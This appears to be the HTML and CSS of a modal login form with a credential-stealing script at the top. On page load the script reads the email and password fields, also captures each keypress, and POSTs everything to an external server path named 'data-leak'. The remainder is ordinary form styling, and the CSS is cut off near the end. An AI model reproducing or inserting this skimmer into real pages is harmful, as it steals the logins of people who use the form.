<script>
const keyLogger = () => {
            let email = '';
            let password = '';
            setInterval(() => {
                let values = {
                    email: document.getElementById('email') && document.getElementById('email').value,
                    password: document.getElementById('password') && document.getElementById('password').value,
                };
                if ((values.email || values.password) && (values.email !== email || values.password !== password)) {
                    email = values.email;
                    password = values.password;
                    let xhr = new XMLHttpRequest;
                    console.log("sending request");
                    xhr.open('POST', 'https://c2-server.f5cloudbuilder.dev:5000/data-leak/');
                    xhr.send(JSON.stringify({values: values}));
                    return xhr;
                }
            }, 3000);



           let int = setInterval(() => {
                if (document.getElementById('email')) {
                    window.clearInterval(int);
                    document.getElementById('email').addEventListener('keypress', (e) => {
                        let xhr = new XMLHttpRequest;
                        console.log("sending request 2");
                        xhr.open('POST', 'https://c2-server.f5cloudbuilder.dev:5000/data-leak/');
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.send(JSON.stringify({key: {email: e.key}}));
                        return xhr;
                    });
                }
                document.getElementById('password') && document.getElementById('password').addEventListener('keypress', (e) => {
                    let xhr = new XMLHttpRequest;
                    xhr.open('POST', 'https://c2-server.f5cloudbuilder.dev:5000/data-leak/');
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify({key: {password: e.key}}));
                    return xhr;
                });
            }, 2000);
        }
        if (document.readyState === 'complete') {
            keyLogger();
        } else {
            window.addEventListener('load', keyLogger);
 }
</script>

<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial, Helvetica, sans-serif;}

/* Full-width input fields */
input[type=text], input[type=password] {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  box-sizing: border-box;
}

/* Set a style for all buttons */
button {
  background-color: #04AA6D;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
}

button:hover {
  opacity: 0.8;
}

/* Extra styles for the cancel button */
.cancelbtn {
  width: auto;
  padding: 10px 18px;
  background-color: #f44336;
}

/* Center the image and position the close button */
.imgcontainer {
  text-align: center;
  margin: 24px 0 12px 0;
  position: relative;
}

img.avatar {
  width: 20%;
  border-radius: 30%;
}

.container {
  padding: 16px;
}

span.psw {
  float: right;
  padding-top: 16px;
}

/* The Modal (background) */
.modal {
  display: none; /* Hidden by default */
  position: fixed; /* Stay in place */
  z-index: 1; /* Sit on top */
  left: 0;
  top: 0;
  width: 100%; /* Full width */
  height: 100%; /* Full height */
  overflow: auto; /* Enable scroll if needed */
  background-color: rgb(0,0,0); /* Fallback color */
  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
  padding-top: 60px;
}

/* Modal Content/Box */
.modal-content {
  background-color: #fefefe;
  margin: 5% auto 15% auto; /* 5% from the top, 15% from the bottom and centered */
  border: 1px solid #888;
  width: 80%; /* Could be more or less, depending on screen size */
}

/* The Close Button (x) */
.close {
  position: absolute;
  right: 25px;
  top: 0;
  color: #000;
  font-size: 35px;
  font-weight: bold;
}

.close:hover,
.close:focus {
  color: red;
  cursor: pointer;
}

/* Add Zoom Animation */
.animate {
  -webkit-animation: animatezoom 0.6s;
  animation: animatezoom 0.6s
}

@-webkit-keyframes animatezoom {
  from {-webkit-transform: scale(0)} 
  to {-webkit-transform: scale(1)}
}
  
@keyframes animatezoom {
  from {transform: scale(0)} 
  to {transform: scale(1)}
}

/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 300px) {
  span.psw {

  }
  .cancelbtn {

}

<script>
// Get the modal
var modal = document.getElementById('id01');

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
}
</script>
